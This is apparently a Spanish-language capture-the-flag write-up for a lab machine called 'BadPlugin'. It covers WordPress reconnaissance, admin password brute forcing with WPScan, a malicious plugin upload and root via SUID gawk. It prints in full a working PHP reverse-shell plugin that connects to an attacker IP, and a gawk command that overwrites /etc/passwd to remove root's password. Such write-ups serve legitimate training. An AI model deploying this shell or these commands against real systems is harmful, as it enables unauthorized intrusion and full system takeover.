Con la máquina **`BadPlugin`** ya levantada, probaremos si responde realizando un ping a la máquina víctima.

![[Pasted image 20250106184951.png]]

Como tenemos respuesta de la máquina víctima, procederemos a realizar la fase de **`reconocimiento`** de puertos utilizando `nmap`.

![[Pasted image 20250106184930.png]]

Una vez realizado el reconocimiento de puertos, procederemos a identificar las versiones y servicios que se ejecutan en ellos, utilizando la herramienta **extractPorts** para facilitar el análisis.

![[Pasted image 20250106185433.png]]



Como solo tenemos abierto el puerto 80, esto indica la posible presencia de un servidor web. Procederemos a verificarlo para analizar su contenido.
![[Pasted image 20250106185452.png]]

Al analizar la web, notamos un botón que, al hacer clic, muestra una alerta con el mensaje: **"A terrible error while establishing a connection with the database"**. Esto sugiere un posible problema de configuración o una vulnerabilidad relacionada con la conexión a la base de datos. 
 ![[Pasted image 20250106190536.png]]

Siguiendo con la fase de reconocimiento, procederemos a realizar el escaneo de directorios utilizando **Gobuster**.

En los resultados de **Gobuster**, hemos identificado tres directorios. Procederemos a ingresar a cada uno de ellos para analizar las rutas y explorar su contenido.

![[Pasted image 20250106192010.png]]

[ * ] Ruta http://192.168.1.100/wordpress/:

En esta ruta, verificamos que no se carga nada, pero al observar la URL, notamos que está intentando cargar un dominio. Agregaremos este dominio al archivo **/etc/hosts** para que la web se cargue correctamente, habilitando así el **virtual hosting**.

![[Pasted image 20250106192806.png]]

Agregando dominio a /etc/hosts

![[Pasted image 20250106193048.png]]

Al recargar la página, ahora podemos acceder a la web correctamente.

Una vez analizada la web, no se encontró nada potencialmente interesante o vulnerable en su contenido. Procederemos a realizar un reconocimiento de directorios en dicha ruta `http://escolares.dl/wordpress/` para explorar posibles recursos adicionales.

![[Pasted image 20250106193209.png]]


Al realizar el reconocimiento de directorios en la ruta, notamos una gran cantidad de directorios, de los cuales **wp-admin** nos llama la atención, ya que es un directorio clave en aplicaciones basadas en WordPress. En versiones antiguas de WordPress, este directorio permitía la enumeración de usuarios, lo que podría ser una posible vulnerabilidad a explotar.

![[Pasted image 20250106194803.png]]

Al probar con el usuario **admin** y cualquier contraseña, notamos que el mensaje de error indica que el usuario **admin** existe. Esto confirma que se trata de una vía potencial para la enumeración de usuarios, lo que podría ser aprovechado para identificar usuarios válidas en el sistema.


![[Pasted image 20250106195312.png]]

Con WPScan también podemos enumerar usuarios, buscar vulnerabilidades en la instalación de WordPress y en los plugins. Esto nos permitirá verificar si alguno de los plugins instalados presenta vulnerabilidades conocidas que puedan ser explotadas.

[ * ] Resultado WPSCAN:

Tenemos **XMLRPC** habilitado, el cual fue sometido al respectivo análisis. Tras la revisión, no se detectaron vulnerabilidades, ya que **no se encontraron configuraciones inseguras ni fallos conocidos** que pudieran ser explotados en esta instalación específica.

![[Pasted image 20250106200544.png]]

Si WPScan no está mostrando los plugins instalados en la web, es importante recordar que existen varios métodos de enumeración de plugins. Incluso el propio como **`nmap`** pueden utilizarse para detectar plugins.

![[Pasted image 20250106201842.png]]
WPSCAN nos enumero usarios validos en la web cual podemos aprovechar para poder descrubrir su contrase;a mediante la fuerza bruta
![[Pasted image 20250106204502.png]]

# REFERENCIA Y APRENDIZAJE

---

Siguiendo con la enumeración de plugins, en este caso se utilizará Nuclei para identificar los plugins existentes en la instalación de WordPress.

```bash
nuclei -u http://escolares.dl/wordpress/ -itags fuzz -t /root/.local/nuclei-templates/http/fuzzing/wordpress-plugins-detect.yaml
```

Dado que **`nuclei`** realiza un fuzzing de plugins, el proceso tiende a demorar. 

Durante el reconocimiento, se encontraron 2 plugins instalados, y Nuclei nos proporcionó la versión de dichos plugins, lo cual podemos aprovechar para intentar escalar privilegios.

![[Pasted image 20250106203057.png]]

---
 
Continuando con la enumeración, ya que encontramos un usuario, realizaremos un ataque de fuerza bruta utilizando **`WPScan`** con el usuario **`admin`**, identificado previamente con la misma herramienta.

```bash
wpscan --url http://escolares.dl/wordpress/ -U admin -P /usr/share/wordlists/rockyou.txt 
```


![[Pasted image 20250106210154.png]]

¡BINGO! Ahora que tenemos la contraseña del usuario admin, podemos autenticarnos en el panel de administración de WordPress.

Al ingresar las credenciales, se muestra la siguiente ventana, en la cual haremos clic en "Recuérdamelo más tarde" 

![[Pasted image 20250106210430.png]]

¡Y pa dentro! Ahora estamos en el panel de control de WordPress.

![[Pasted image 20250106210652.png]]

Ahora procederemos a ir al apartado de Plugins para comprobar si el sistema nos permite subir un plugin malicioso y así poder ganar acceso a la máquina víctima.

Procederemos a crear un plugin malicioso ayudándonos de la reverse shell de PentestMonkey, el cual adaptaremos para que WordPress lo reconozca como un plugin.

Creamos un fichero llamado revPlugin.php cuyo contenido sera lo siguiente:

```bash
<?php
/*
Plugin Name: Reverse Shell Plugin
Plugin URI: https://github.com/SkyW4r33x
Description: Plugin RevShell
Version: 1.0
Author: SkyW4r33x
Author URI: https://github.com/SkyW4r33x
License: GPL2
*/
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.1.14';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

```

Procederemos a comprimir la revershell en un archivo zip para, posteriormente, subirlo a WordPress como un plugin más.

![[Pasted image 20250107114444.png]]

![[Pasted image 20250107114641.png]]

Nos ponemos en modo escucha en nuestra maquina atacante:

![[Pasted image 20250107114714.png]]
En la parte de plugins de WordPress encontraremos nuestro plugin subido, el cual, al activarlo, debemos obtener la reverse shell.


![[Pasted image 20250107114754.png]]


¡BINGO! Ahora podemos analizar el sistema para poder elevar privilegios en la máquina víctima.


![[Pasted image 20250107115032.png]]

Sin antes realizar el tratamiento de la TTY.

```bash
# Inicia sesión bash
script /dev/null -c bash

# Suspende proceso
Ctrl + Z

# Configura terminal
stty raw -echo; fg
reset xterm
export TERM=xterm

# Alias útiles
alias ll='clear; ls -lsaht --color=auto'
alias ..='cd ..'
```

Ya dentro de la máquina, vamos a listar los permisos SUID que tiene el sistema, los cuales nos ayudarán a elevar privilegios. En este caso, encontramos el binario **gawk**.

![[Pasted image 20250107115937.png]]

Al irnos a **GTFOBins** y filtrar por **gawk**, encontraremos que este binario se puede utilizar para ejecutar comandos con privilegios elevados, el cual ninguno de los metodos nos ayuda a elevar los privilegios.

![[Pasted image 20250107120600.png]]


Ya que **gawk** es SUID, probaremos modificar el archivo **/etc/passwd** haciendo una copia en el directorio **/tmp/**.

Editaremos dicha copia y eliminaremos la "x" del usuario **root** para que, al autenticarnos como root, no se nos solicite una contraseña.

![[Pasted image 20250107181916.png]]

![[Pasted image 20250107182821.png]]


![[Pasted image 20250107182832.png]]


Usando la ruta absoluta de **gawk**, sobrescribimos **/etc/passwd** con una copia modificada desde **/tmp/passwd**. Esto elimina la contraseña del usuario root, permitiendo acceso como superusuario sin restricciones.

```bash
www-data@e8e8d42acd23:/tmp$ /usr/bin/gawk 'BEGIN { 
    while ((getline < "/tmp/passwd") > 0) print > "/etc/passwd"; 
    while ((getline < "/etc/passwd") > 0) print > "/etc/passwd"; 
}'
```

¡Y somos root!

![[Pasted image 20250107182901.png]]

 